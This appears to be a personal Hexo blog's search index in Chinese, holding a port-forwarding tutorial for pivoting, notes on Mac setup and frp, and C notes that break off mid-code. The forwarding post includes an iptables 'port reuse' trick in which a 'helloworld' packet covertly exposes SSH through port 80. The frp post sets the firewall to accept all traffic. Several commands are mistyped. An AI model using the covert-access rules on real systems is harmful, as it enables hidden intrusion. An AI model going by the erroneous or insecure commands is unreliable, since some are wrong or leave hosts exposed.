<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>端口转发(port forwarding)</title>
      <link href="/posts/2087.html"/>
      <url>/posts/2087.html</url>
      
        <content type="html"><![CDATA[<h3 id="基于linux端口转发"><a href="#基于linux端口转发" class="headerlink" title="基于linux端口转发"></a>基于linux端口转发</h3><h4 id="自带工具"><a href="#自带工具" class="headerlink" title="自带工具"></a>自带工具</h4><div class="tabs" id="linux自带"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#linux自带-1"><i class="fab fa-linux"></i>iptables</button></li><li class="tab"><button type="button" data-href="#linux自带-2"><i class="fab fa-linux"></i>ssh</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="linux自带-1"><p><em><strong>前置条件：root权限</strong></em><br><strong>优点：基于内核转发，不同于ssh转发，无需新建链路</strong><br><strong>1. 开启iptables端口转发：</strong></p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">### 1.以下两种方法都可</span></span><br><span class="line"><span class="built_in">echo</span> /proc/sys/net/ipv4/ip_forward &gt; 1 </span><br><span class="line">sysctl -w net.ipv4.ip_forward</span><br><span class="line"><span class="comment">### 2.修改net.ipv4.ip_forward = 1 此操作主要是设置开启启动 跳过也可</span></span><br><span class="line">vim /etc/sysctl.conf</span><br></pre></td></tr></tbody></table></figure><p><strong>2. 添加转发规则</strong></p><p><strong>0x01 转发本地</strong></p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#将7777端口流量以tcp形式转发到6666端口</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 7777 -j REDIRECT --to-port 6666</span><br><span class="line"><span class="comment">#下面这种也可以</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 7777 -j DNAT --to-destination [nat_ip]:6666</span><br><span class="line"><span class="comment">#打开iptables的NAT功能</span></span><br><span class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220919170138484.png" alt="查看转发规则" style="zoom:60%;"><p>本地未开启链路监听<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220919170322638.png" alt="本地未监听端口" style="zoom:67%;"></p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220919171342804.png" alt="同样未开启" style="zoom:50%;"><p>开启转发的机器使用ncat监听6666流量并将转发bash命令，在另一台机器上使用nc请求7777端口，成功建立连接并执行命令<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220919170758569.png" alt="7777转发给6666成功" style="zoom:67%;"></p><p><strong>建立连接的端口有所区别</strong><br><em>远程</em><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220919173604717.png" alt="其他机器连接端口为7777" style="zoom:67%;"></p><p><em>本地</em><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220919173620775.png" alt="本地连接端口为6666" style="zoom:67%;"></p><p><strong>0x02 作为路由转发其他</strong></p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220920120743829.png" alt="转发示意图" style="zoom:67%;"><p>本地添加两条转发规则</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 6666 -j DNAT --to-destination 10.211.55.4:7777</span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp --d 10.211.55.4 --dport 7777 -j SNAT --to-source 10.211.55.3</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220920121404965.png" alt="规则表" style="zoom:67%;"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220920115421882.png" alt="配置表" style="zoom:67%;"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220920115813437.png" alt="转发成功" style="zoom:50%;"><p>实测填写本地ip转发失败，可能是因为使用的不是一个网络出口？</p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220920121900612.png" alt="0.0.0.0和127.0.0.1转发失败" style="zoom:67%;"><p>由于是内核转发，使用ss看不到任何链接</p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220920122139081.png" alt="没有转发链路" style="zoom:67%;"><p>未填写转发端口的情况：<br><strong>慎用！</strong>将转发对应端口的流量，来什么转什么，也就是说，退出了ssh后就连不上了…</p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220920143830156.png" alt="全流量转发" style="zoom:67%;"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220920143918148.png" alt="连不上，怎么想都连不上吧" style="zoom:50%;"><p><strong>0x03 端口复用</strong></p><p>自定义一条链路，添加匹配规则，将匹配到的流量转移到链路中</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">### 创建端口复用链路</span></span><br><span class="line">iptables -t nat -N MYROUTING</span><br><span class="line"><span class="comment">### 创建端口复用规则，将任意来源端口流量转移至22端口</span></span><br><span class="line">iptables -t nat -A MYROUTING -p tcp -j REDIRECT --to-port 22</span><br><span class="line"><span class="comment">### 设置开启开关，当接受到包含"helloworld"的tcp包时，将来源ip添加到复用链路中</span></span><br><span class="line">iptables -A INPUT -p tcp -m string --string <span class="string">"helloworld"</span> --algo bm -m recent --<span class="built_in">set</span> --name MYROUTING --rsource -j ACCEPT</span><br><span class="line"><span class="comment">### 设置关闭开关，当接受到包含"byebyeworld"的tcp包时，将来源ip移除到复用链路中</span></span><br><span class="line">iptables -A INPUT -p tcp -m string --string <span class="string">"byebyeworld"</span> --algo bm -m recent --name MYROUTING --remove -j ACCEPT</span><br><span class="line"><span class="comment">### 当SYN包的来源ip处于复用链路列表中时，将跳转至复用列表进行处理，有效果时间为3600秒</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name MYROUTING --rsource -j MYROUTING</span><br></pre></td></tr></tbody></table></figure><p>实际效果：</p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/屏幕录制2022-09-20 17.21.21.gif" alt="效果图" style="zoom:67%;"><p><strong>3. 其他命令</strong></p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#删除指定类型序号规则</span></span><br><span class="line">iptables -t nat -D PREROUTING 1 </span><br><span class="line"><span class="comment">#查看现有规则表</span></span><br><span class="line">iptables -t nat -nL --line</span><br><span class="line"><span class="comment">#转发本机到aaaa端口的流量到bbbb端口</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport aaaa -j REDIRECT --to-port bbbb </span><br></pre></td></tr></tbody></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="linux自带-2"><p><strong>0x00 本地端口转发</strong></p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">ssh –fgN –L lport:localhost:rprot locahhost</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220921115213908.png" alt="本地端口转发" style="zoom:67%;"><p><strong>0x01 远程端口转发</strong></p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">ssh –fgN –R lport:rhost:rprot locahhost</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220921115305394.png" alt="远程端口转发" style="zoom:67%;"><p><strong>0x02 动态转发，本地开启socks5端口转发流量</strong></p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">ssh –fgN –D lport root@rhost</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220921115514862.png" alt="动态转发" style="zoom:67%;"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h4 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h4><p>其他的太多了，只列举部分</p><div class="tabs" id="其他"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#其他-1"><i class="fab fa-linux"></i>ncat</button></li><li class="tab"><button type="button" data-href="#其他-2"><i class="fab fa-linux"></i>ncat</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="其他-1"><p>本地监听端口并转发请求目标端口流量</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">ncat --sh-exec <span class="string">"ncat rhost rport"</span> -l lport --keep-open</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220921120206975.png" alt="ncat转发22端口流量" style="zoom:67%;"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="其他-2"><p>本地监听端口并转发请求目标端口流量</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:lport.reuseaddr,fork TCP4:rhost:rport</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220921120425354.png" alt="socat端口转发" style="zoom:67%;"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="基于windows端口转发"><a href="#基于windows端口转发" class="headerlink" title="基于windows端口转发"></a>基于windows端口转发</h3><h4 id="自带工具-1"><a href="#自带工具-1" class="headerlink" title="自带工具"></a>自带工具</h4><div class="tabs" id="win自带"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#win自带-1"><i class="fab fa-windows"></i>netsh</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="win自带-1"><p><strong>前置条件：administrator权限</strong></p><p><strong>0x00 转发远程</strong></p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#将远程服务8081端口流量转发至本地8888端口</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=localhost listenport=lport connectaddress=rhost connectport=rport</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220921120818352.png" alt="netsh端口转发" style="zoom:67%;"><p><strong>0x01 正向代理 转发内网其他ip</strong></p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 监听本地2222端口并将流量转发到远程22端口，本地ip为内网地址</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=lhost listenport=lport connectaddress=rhost connectport=rport</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220921123637074.png" alt="55.3添加netsh" style="zoom:67%;"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220921123808786.png" alt="55.4监听2222端口并将流量转发到55.3的22端口" style="zoom:67%;"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2087/image-20220921123852492.png" alt="通过本机请求55.4的2222端口从而链接55.3的22服务" style="zoom:67%;"><p><strong>注：由于与iptables机制不同，使用netsh interface portproxy reset清空代理时建立的链接也会断开</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h4 id="其他工具-1"><a href="#其他工具-1" class="headerlink" title="其他工具"></a>其他工具</h4><p>同样很多，懒得总结，暂时挖坑</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mac环境配置（M1）</title>
      <link href="/posts/dfdf.html"/>
      <url>/posts/dfdf.html</url>
      
        <content type="html"><![CDATA[<h1 id="python环境"><a href="#python环境" class="headerlink" title="python环境"></a>python环境</h1><p>python3环境：直接<a href="https://www.python.org/downloads/release/python-3714/">官网</a>下载就好</p><p>python2环境：根据一位师傅的说法，这样操作，但未成功过</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">brew install pyenv</span><br><span class="line"><span class="built_in">arch</span> x86_64 pyenv install python2.7.18</span><br></pre></td></tr></tbody></table></figure><p>用Python3自带的2to3脚本可直接转换2版本文件为3版本</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">2to3 -w xxx.py</span><br></pre></td></tr></tbody></table></figure><p>旧文件为xxx.bak</p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/dfdf/image-20220913173837464.png" alt="image-20220913173837464" style="zoom:50%;">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用frp+腾讯云远程管理家中主机</title>
      <link href="/posts/fe0f.html"/>
      <url>/posts/fe0f.html</url>
      
        <content type="html"><![CDATA[<p>先挖个坑，慢慢写</p><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul><li>一台公网服务器</li><li>[frp安装包][<a href="https://github.com/fatedier/frp/releases]">https://github.com/fatedier/frp/releases]</a></li></ul><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><ol><li>需要控制的主机和服务器端全部安装frp</li><li>开启防火墙</li><li>测试连通性</li><li>远程登录成功</li></ol><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ol><li>frp端口开启、防火墙开启端口，端口无法访问到</li></ol><p>解决方法：安装firewalld，调整默认策略</p><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install firewalld</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认为拒绝所有访问，改变为允许所有访问</span></span><br><span class="line">firewall-cmd --permanent --zone=public --set-target=ACCEPT</span><br><span class="line">firewall --reload</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言笔记（一）</title>
      <link href="/posts/7e20.html"/>
      <url>/posts/7e20.html</url>
      
        <content type="html"><![CDATA[<h2 id="注-本页面只记录本人在学习中遇到的容易混淆的C语言笔记，内容并不全面，如有需求请自行查询小甲鱼之类dalao教程"><a href="#注-本页面只记录本人在学习中遇到的容易混淆的C语言笔记，内容并不全面，如有需求请自行查询小甲鱼之类dalao教程" class="headerlink" title="*注: 本页面只记录本人在学习中遇到的容易混淆的C语言笔记，内容并不全面，如有需求请自行查询小甲鱼之类dalao教程"></a>*注: 本页面只记录本人在学习中遇到的容易混淆的C语言笔记，内容并不全面，如有需求请自行查询小甲鱼之类dalao教程</h2><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="第一个程序-打印-输入"><a href="#第一个程序-打印-输入" class="headerlink" title="第一个程序 打印 输入"></a>第一个程序 打印 输入</h3><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello world!\n"</span>);</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">char</span> name[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input you age: "</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;i);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input you name: "</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, name);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"age : %d, name : %s\n"</span>, i, name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 格式化输出参数</span></span><br><span class="line">%s  <span class="comment">// 输出字符串</span></span><br><span class="line">%d  <span class="comment">// 输出整型</span></span><br><span class="line">%c  <span class="comment">// 输出字符</span></span><br><span class="line">%f  <span class="comment">// 输出浮点数</span></span><br><span class="line">%u  <span class="comment">// 无符号十进制输出整数</span></span><br><span class="line">%p  <span class="comment">// 输出地址</span></span><br></pre></td></tr></tbody></table></figure><p>参考：<a href="https://www.cnblogs.com/arxive/p/5160007.html">C语言printf格式化输出参数</a></p><h3 id="符号定义常量、标识符、字符串常量"><a href="#符号定义常量、标识符、字符串常量" class="headerlink" title="符号定义常量、标识符、字符串常量"></a>符号定义常量、标识符、字符串常量</h3><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"># 符号定义常量</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NAME <span class="string">"aaa"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AGE 123</span></span><br><span class="line"></span><br><span class="line"># 标识符 identifier</span><br><span class="line">- my_name_is</span><br><span class="line"></span><br><span class="line"># 字符串写法</span><br><span class="line"><span class="type">char</span> a[<span class="number">6</span>] = {<span class="string">'a'</span>,<span class="string">'d'</span>,<span class="string">'m'</span>,<span class="string">'i'</span>,<span class="string">'n'</span>,<span class="string">'\0'</span>}; </span><br><span class="line"><span class="type">char</span> a[] = {<span class="string">'a'</span>,<span class="string">'d'</span>,<span class="string">'m'</span>,<span class="string">'i'</span>,<span class="string">'n'</span>,<span class="string">'\0'</span>}; </span><br><span class="line"><span class="type">char</span> a[] = {<span class="string">"admin\0"</span>}; </span><br><span class="line"><span class="type">char</span> a[] = <span class="string">"admin"</span>; </span><br><span class="line"></span><br><span class="line"># 字符串常量</span><br><span class="line"># 字符串常后多一位\<span class="number">0</span>用于标识字符串结束 也就是%<span class="number">00</span>截断</span><br><span class="line">str = <span class="string">"this is string"</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name: %s"</span>, NAME);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Age: %d"</span>, AGE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="数据类型、类型修饰符"><a href="#数据类型、类型修饰符" class="headerlink" title="数据类型、类型修饰符"></a>数据类型、类型修饰符</h3><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220803上午43909451.png" alt="数据类型" style="zoom:40%;"><p>使用运算符sizeof()获取数据类型或表达式长度</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">sizeof</span>(object); <span class="comment">//对象</span></span><br><span class="line"><span class="keyword">sizeof</span>(type_name); <span class="comment">//类型</span></span><br><span class="line"><span class="keyword">sizeof</span> object; <span class="comment">//对象</span></span><br></pre></td></tr></tbody></table></figure><h4 id="类型修饰符"><a href="#类型修饰符" class="headerlink" title="类型修饰符"></a>类型修饰符</h4><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 用于修饰基本类型</span></span><br><span class="line"><span class="type">char</span></span><br><span class="line"><span class="type">short</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="type">long</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span></span><br><span class="line"><span class="type">signed</span> <span class="type">short</span> <span class="type">int</span> <span class="comment">// 有符号 -32768 ~ 32767</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span><span class="comment">// 无符号 0 ~ 65535</span></span><br></pre></td></tr></tbody></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="一元"><a href="#一元" class="headerlink" title="一元"></a>一元</h4><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line">  <span class="comment">// 写法</span></span><br><span class="line">    <span class="type">int</span> sum[NUM] ={<span class="number">0</span>}; <span class="comment">// 自动填充为0</span></span><br><span class="line">    <span class="type">int</span> sum[NUM] ={<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>}; <span class="comment">// 只赋值前5位，后5位自动填充为0</span></span><br><span class="line">    <span class="type">int</span> sum[NUM] ={[<span class="number">2</span>]=<span class="number">3</span>,[<span class="number">5</span>]=<span class="number">6</span>}; <span class="comment">// 指定位赋值，其余自动填充为0</span></span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> length = <span class="keyword">sizeof</span>(sum) / <span class="keyword">sizeof</span>(sum[<span class="number">0</span>]) <span class="comment">// 数组长度</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt; NUM; i++){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum[i]);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="二元"><a href="#二元" class="headerlink" title="二元"></a>二元</h4><p>多元以此类推</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="comment">// 写法</span></span><br><span class="line">    <span class="type">float</span> sum1[<span class="number">3</span>][<span class="number">3</span>] = {<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">2.1</span>, <span class="number">2.2</span>, <span class="number">2.3</span>, <span class="number">3.1</span>, <span class="number">3.2</span>, <span class="number">3.3</span>};</span><br><span class="line">    <span class="type">float</span> sum2[<span class="number">3</span>][<span class="number">3</span>] = {{<span class="number">1.1</span>}, {<span class="number">0.0</span>, <span class="number">2.2</span>}, {<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">3.3</span>}};</span><br><span class="line">    <span class="type">float</span> sum3[<span class="number">3</span>][<span class="number">3</span>] = {[<span class="number">0</span>][<span class="number">2</span>] = <span class="number">1.3</span>, [<span class="number">1</span>][<span class="number">1</span>] = <span class="number">2.2</span>, [<span class="number">2</span>][<span class="number">0</span>] = <span class="number">3.1</span>};</span><br><span class="line">  <span class="comment">// 获取数组行列数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sum1总大小：sizeof %lu\n"</span>, <span class="keyword">sizeof</span>(sum1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sum1第一元大小：sizeof %lu\n"</span>, <span class="keyword">sizeof</span>(sum1[<span class="number">0</span>]));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sum1列数：%lu\n"</span>, <span class="keyword">sizeof</span>(sum1[<span class="number">0</span>])/<span class="keyword">sizeof</span>(<span class="type">float</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sum1行数：%lu\n"</span>, <span class="keyword">sizeof</span>(sum1)/<span class="keyword">sizeof</span>(sum1[<span class="number">0</span>]));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"float：sizeof %lu\n"</span>, <span class="keyword">sizeof</span>(<span class="type">float</span>));</span><br><span class="line">  <span class="comment">// 下面为结果</span></span><br><span class="line">   <span class="type">int</span> i, j, n1 = (<span class="keyword">sizeof</span>(sum1[<span class="number">0</span>]) / <span class="keyword">sizeof</span>(<span class="type">float</span>)), n2 = (<span class="keyword">sizeof</span>(sum1) / <span class="keyword">sizeof</span>(sum1[<span class="number">0</span>]));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n2; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n1; j++)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%.1f "</span>, sum1[i][j]);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    }</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n2; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n1; j++)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%.1f "</span>, sum2[i][j]);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    }</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n2; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n1; j++)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%.1f "</span>, sum3[i][j]);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> a = <span class="number">123</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">345</span>;</span><br><span class="line">    <span class="type">int</span> *pa = &amp;a, *pb = &amp;b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"赋值前 ... \npa: %d addr: %p\n"</span>, *pa, pa);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pb: %d addr: %p\n"</span>, *pb, pb);</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"赋值后 ... \npa: %d addr: %p\n"</span>, *pa, pa);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pb: %d addr: %p\n"</span>, *pb, pb);</span><br><span class="line">    pa = &amp;b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"交换地址后 ... \npa: %d addr: %p\n"</span>, *pa, pa);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pb: %d addr: %p\n"</span>, *pb, pb);</span><br><span class="line">    b = <span class="number">123</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"单独给b赋值 ... \npa: %d addr: %p\n"</span>, *pa, pa);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pb: %d addr: %p\n"</span>, *pb, pb);</span><br><span class="line">    <span 